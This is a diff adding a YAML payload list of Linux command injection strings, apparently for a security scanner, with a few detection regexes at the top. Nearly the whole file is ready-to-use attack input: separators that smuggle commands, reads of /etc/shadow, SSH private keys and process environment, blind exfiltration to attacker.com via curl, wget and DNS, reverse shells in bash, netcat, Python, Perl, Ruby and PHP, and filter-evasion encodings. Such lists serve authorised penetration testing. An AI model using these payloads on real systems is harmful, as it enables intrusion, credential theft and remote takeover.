@@ -1,0 +1,572 @@
+metadata:
+  type: cmdi/linux
+  version: "1.0"
+  description: "Linux command injection payloads"
+  sources: ["OWASP", "PayloadsAllTheThings", "HackTricks"]
+
+detection_patterns:
+  - "uid=\\d+\\(.*?\\)"
+  - "root:.*?:0:0:"
+  - "Linux.*?\\d+\\.\\d+"
+
+payloads:
+  basic:
+    - value: ";id"
+      description: "Semicolon id command"
+      severity: critical
+      tags: [basic, semicolon]
+
+    - value: "|id"
+      description: "Pipe id command"
+      severity: critical
+      tags: [basic, pipe]
+
+    - value: "`id`"
+      description: "Backtick id command"
+      severity: critical
+      tags: [basic, backtick]
+
+    - value: "$(id)"
+      description: "Dollar paren id"
+      severity: critical
+      tags: [basic, dollar_paren]
+
+    - value: "; whoami"
+      description: "Semicolon whoami"
+      severity: critical
+      tags: [basic, semicolon]
+
+    - value: "| whoami"
+      description: "Pipe whoami"
+      severity: critical
+      tags: [basic, pipe]
+
+    - value: "`whoami`"
+      description: "Backtick whoami"
+      severity: critical
+      tags: [basic, backtick]
+
+    - value: "$(whoami)"
+      description: "Dollar paren whoami"
+      severity: critical
+      tags: [basic, dollar_paren]
+
+    - value: "; ls -la"
+      description: "Semicolon ls"
+      severity: high
+      tags: [basic, semicolon, ls]
+
+    - value: "| ls -la"
+      description: "Pipe ls"
+      severity: high
+      tags: [basic, pipe, ls]
+
+    - value: "; cat /etc/passwd"
+      description: "Semicolon cat passwd"
+      severity: critical
+      tags: [basic, semicolon, file_read]
+
+    - value: "| cat /etc/passwd"
+      description: "Pipe cat passwd"
+      severity: critical
+      tags: [basic, pipe, file_read]
+
+    - value: "`cat /etc/passwd`"
+      description: "Backtick cat passwd"
+      severity: critical
+      tags: [basic, backtick, file_read]
+
+    - value: "$(cat /etc/passwd)"
+      description: "Dollar paren cat passwd"
+      severity: critical
+      tags: [basic, dollar_paren, file_read]
+
+    - value: "&& id"
+      description: "AND id command"
+      severity: critical
+      tags: [basic, and]
+
+    - value: "|| id"
+      description: "OR id command"
+      severity: critical
+      tags: [basic, or]
+
+    - value: "%0aid"
+      description: "Newline id command"
+      severity: critical
+      tags: [basic, newline]
+
+    - value: "\\nid"
+      description: "Escape newline id"
+      severity: critical
+      tags: [basic, newline]
+
+    - value: "%0a id"
+      description: "Newline space id"
+      severity: critical
+      tags: [basic, newline]
+
+    - value: "';id;#"
+      description: "Quote breakout id"
+      severity: critical
+      tags: [basic, breakout]
+
+    - value: "\";id;#"
+      description: "Double quote breakout id"
+      severity: critical
+      tags: [basic, breakout]
+
+    - value: "';id'"
+      description: "Single quote id"
+      severity: critical
+      tags: [basic, breakout]
+
+    - value: "\";id\""
+      description: "Double quote id"
+      severity: critical
+      tags: [basic, breakout]
+
+  chaining:
+    - value: "; whoami && cat /etc/passwd"
+      description: "Chain whoami + passwd"
+      severity: critical
+      tags: [chain]
+
+    - value: "; id; uname -a"
+      description: "Chain id + uname"
+      severity: critical
+      tags: [chain]
+
+    - value: "; id && uname -a && cat /etc/issue"
+      description: "Triple chain info"
+      severity: critical
+      tags: [chain]
+
+    - value: "; ls -la /tmp/"
+      description: "List tmp directory"
+      severity: high
+      tags: [chain, ls]
+
+    - value: "; cat /etc/shadow"
+      description: "Read shadow file"
+      severity: critical
+      tags: [chain, file_read]
+
+    - value: "; cat /proc/version"
+      description: "Read kernel version"
+      severity: high
+      tags: [chain, file_read]
+
+    - value: "; cat /proc/self/environ"
+      description: "Read environment"
+      severity: critical
+      tags: [chain, file_read]
+
+    - value: "; cat ~/.ssh/id_rsa"
+      description: "Read SSH key"
+      severity: critical
+      tags: [chain, file_read]
+
+    - value: "; netstat -tlnp"
+      description: "List listening ports"
+      severity: high
+      tags: [chain, network]
+
+    - value: "; ifconfig"
+      description: "Network interfaces"
+      severity: high
+      tags: [chain, network]
+
+    - value: "; ip addr"
+      description: "IP addresses"
+      severity: high
+      tags: [chain, network]
+
+    - value: "; ps aux"
+      description: "Process list"
+      severity: high
+      tags: [chain, process]
+
+    - value: "; df -h"
+      description: "Disk usage"
+      severity: medium
+      tags: [chain, disk]
+
+    - value: "; env"
+      description: "Environment variables"
+      severity: high
+      tags: [chain, env]
+
+    - value: "; set"
+      description: "Shell variables"
+      severity: high
+      tags: [chain, env]
+
+    - value: "; export"
+      description: "Exported variables"
+      severity: high
+      tags: [chain, env]
+
+    - value: "; find / -perm -4000 2>/dev/null"
+      description: "Find SUID binaries"
+      severity: high
+      tags: [chain, privesc]
+
+    - value: "; find / -writable -type f 2>/dev/null"
+      description: "Find writable files"
+      severity: high
+      tags: [chain, privesc]
+
+    - value: "; cat /etc/crontab"
+      description: "Read crontab"
+      severity: high
+      tags: [chain, cron]
+
+    - value: "; ls -la /etc/cron*"
+      description: "List cron directories"
+      severity: high
+      tags: [chain, cron]
+
+    - value: "; cat /etc/hosts"
+      description: "Read hosts file"
+      severity: medium
+      tags: [chain, network]
+
+    - value: "; cat /etc/resolv.conf"
+      description: "Read DNS config"
+      severity: medium
+      tags: [chain, network]
+
+  blind:
+    - value: "; ping -c 3 attacker.com"
+      description: "Blind ping"
+      severity: high
+      tags: [blind, ping]
+
+    - value: "| ping -c 3 attacker.com"
+      description: "Pipe blind ping"
+      severity: high
+      tags: [blind, ping]
+
+    - value: "`ping -c 3 attacker.com`"
+      description: "Backtick blind ping"
+      severity: high
+      tags: [blind, ping]
+
+    - value: "$(ping -c 3 attacker.com)"
+      description: "Dollar paren ping"
+      severity: high
+      tags: [blind, ping]
+
+    - value: "; ping -c 3 `whoami`.attacker.com"
+      description: "Ping with data exfil"
+      severity: critical
+      tags: [blind, ping, exfil]
+
+    - value: "; curl http://attacker.com/"
+      description: "Blind curl"
+      severity: high
+      tags: [blind, curl]
+
+    - value: "| curl http://attacker.com/"
+      description: "Pipe blind curl"
+      severity: high
+      tags: [blind, curl]
+
+    - value: "; curl http://attacker.com/$(whoami)"
+      description: "Curl with data exfil"
+      severity: critical
+      tags: [blind, curl, exfil]
+
+    - value: "; curl http://attacker.com/$(cat /etc/passwd | base64)"
+      description: "Curl base64 exfil"
+      severity: critical
+      tags: [blind, curl, exfil]
+
+    - value: "; wget http://attacker.com/"
+      description: "Blind wget"
+      severity: high
+      tags: [blind, wget]
+
+    - value: "| wget http://attacker.com/"
+      description: "Pipe blind wget"
+      severity: high
+      tags: [blind, wget]
+
+    - value: "; wget http://attacker.com/$(hostname)"
+      description: "Wget with hostname exfil"
+      severity: critical
+      tags: [blind, wget, exfil]
+
+    - value: "; nslookup attacker.com"
+      description: "Blind nslookup"
+      severity: high
+      tags: [blind, dns]
+
+    - value: "; nslookup `whoami`.attacker.com"
+      description: "DNS exfil whoami"
+      severity: critical
+      tags: [blind, dns, exfil]
+
+    - value: "; dig attacker.com"
+      description: "Blind dig"
+      severity: high
+      tags: [blind, dns]
+
+    - value: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+      description: "Reverse shell bash"
+      severity: critical
+      tags: [blind, reverse_shell]
+
+    - value: "; nc -e /bin/bash attacker.com 4444"
+      description: "Reverse shell netcat"
+      severity: critical
+      tags: [blind, reverse_shell]
+
+    - value: "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
+      description: "Reverse shell python"
+      severity: critical
+      tags: [blind, reverse_shell]
+
+    - value: "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
+      description: "Reverse shell perl"
+      severity: critical
+      tags: [blind, reverse_shell]
+
+    - value: "; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/bash -i <&%d >&%d 2>&%d\",f,f,f)'"
+      description: "Reverse shell ruby"
+      severity: critical
+      tags: [blind, reverse_shell]
+
+    - value: "; php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
+      description: "Reverse shell php"
+      severity: critical
+      tags: [blind, reverse_shell]
+
+  encoding:
+    - value: "; echo$(printf '\\x69\\x64')"
+      description: "Hex encoded id"
+      severity: critical
+      tags: [encoding, hex]
+
+    - value: "; echo$(printf '\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64')"
+      description: "Hex encoded cat passwd"
+      severity: critical
+      tags: [encoding, hex]
+
+    - value: "; echo -e '\\x69\\x64'"
+      description: "Echo hex id"
+      severity: critical
+      tags: [encoding, hex]
+
+    - value: "; echo 'aWQ=' | base64 -d | sh"
+      description: "Base64 encoded id"
+      severity: critical
+      tags: [encoding, base64]
+
+    - value: "; echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh"
+      description: "Base64 cat passwd"
+      severity: critical
+      tags: [encoding, base64]
+
+    - value: "; eval$(echo 'aWQ=' | base64 -d)"
+      description: "Eval base64 id"
+      severity: critical
+      tags: [encoding, base64]
+
+    - value: "; $'\\x69\\x64'"
+      description: "ANSI-C quoting id"
+      severity: critical
+      tags: [encoding, ansi_c]
+
+    - value: "; $'\\x63\\x61\\x74\\x20\\x2f\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64'"
+      description: "ANSI-C quoting cat passwd"
+      severity: critical
+      tags: [encoding, ansi_c]
+
+    - value: "; printf '\\x69\\x64'|sh"
+      description: "Printf hex + sh"
+      severity: critical
+      tags: [encoding, hex]
+
+    - value: "; /???/??t /???/p??s??"
+      description: "Glob pattern cat passwd"
+      severity: critical
+      tags: [encoding, glob]
+
+    - value: "; /bin/ca? /etc/passwd"
+      description: "Question mark bypass"
+      severity: critical
+      tags: [encoding, glob]
+
+    - value: "; /bin/c[a]t /etc/passwd"
+      description: "Bracket bypass"
+      severity: critical
+      tags: [encoding, glob]
+
+    - value: "; c\\at /etc/passwd"
+      description: "Backslash bypass"
+      severity: critical
+      tags: [encoding, backslash]
+
+    - value: "; w'h'o'am'i"
+      description: "Quote bypass whoami"
+      severity: critical
+      tags: [encoding, quote]
+
+    - value: "; c''at /etc/passwd"
+      description: "Empty quote bypass"
+      severity: critical
+      tags: [encoding, quote]
+
+    - value: "; c\"\"at /etc/passwd"
+      description: "Double empty quote bypass"
+      severity: critical
+      tags: [encoding, quote]
+
+    - value: "; w`echo`hoami"
+      description: "Backtick echo bypass"
+      severity: critical
+      tags: [encoding, backtick]
+
+    - value: "; cat /etc/pas?wd"
+      description: "Question mark in path"
+      severity: critical
+      tags: [encoding, glob]
+
+    - value: "; cat /etc/pa??wd"
+      description: "Double question mark"
+      severity: critical
+      tags: [encoding, glob]
+
+    - value: "; {cat,/etc/passwd}"
+      description: "Brace expansion"
+      severity: critical
+      tags: [encoding, brace]
+
+    - value: "; {id,}"
+      description: "Brace expansion id"
+      severity: critical
+      tags: [encoding, brace]
+
+    - value: "; cat${IFS}/etc/passwd"
+      description: "IFS variable bypass"
+      severity: critical
+      tags: [encoding, ifs]
+
+    - value: "; cat$IFS/etc/passwd"
+      description: "IFS no braces"
+      severity: critical
+      tags: [encoding, ifs]
+
+    - value: "; {cat,/etc/passwd}"
+      description: "Brace cat passwd"
+      severity: critical
+      tags: [encoding, brace]
+
+    - value: "; id%0a"
+      description: "Newline terminated id"
+      severity: critical
+      tags: [encoding, newline]
+
+    - value: "; cat /etc/passwd%0a"
+      description: "Newline terminated cat"
+      severity: critical
+      tags: [encoding, newline]
+
+    - value: "|| id"
+      description: "OR id (no leading space)"
+      severity: critical
+      tags: [encoding, no_space]
+
+    - value: "&& id"
+      description: "AND id (no leading space)"
+      severity: critical
+      tags: [encoding, no_space]
+
+  time_based:
+    - value: "; sleep 5"
+      description: "Sleep 5s"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "| sleep 5"
+      description: "Pipe sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "`sleep 5`"
+      description: "Backtick sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "$(sleep 5)"
+      description: "Dollar paren sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "; ping -c 5 127.0.0.1"
+      description: "Ping delay"
+      severity: high
+      tags: [time_based, ping]
+
+    - value: "; sleep 5 && echo done"
+      description: "Sleep with confirmation"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "; /bin/sleep 5"
+      description: "Full path sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "&& sleep 5"
+      description: "AND sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "|| sleep 5"
+      description: "OR sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+    - value: "%0a sleep 5"
+      description: "Newline sleep"
+      severity: high
+      tags: [time_based, sleep]
+
+  output_redirect:
+    - value: "; id > /tmp/output.txt"
+      description: "Redirect id to file"
+      severity: high
+      tags: [output_redirect]
+
+    - value: "; cat /etc/passwd > /tmp/p.txt"
+      description: "Redirect passwd to file"
+      severity: high
+      tags: [output_redirect]
+
+    - value: "; id >> /tmp/output.txt"
+      description: "Append id to file"
+      severity: high
+      tags: [output_redirect]
+
+    - value: "; id 2>&1"
+      description: "Redirect stderr"
+      severity: high
+      tags: [output_redirect]
+
+    - value: "; id | tee /tmp/output.txt"
+      description: "Tee output"
+      severity: high
+      tags: [output_redirect]
+
+    - value: "; cat /etc/passwd | base64"
+      description: "Base64 output"
+      severity: high
+      tags: [output_redirect, encoding]
+
+    - value: "; id | xxd"
+      description: "Hex dump output"
+      severity: high
+      tags: [output_redirect, encoding]
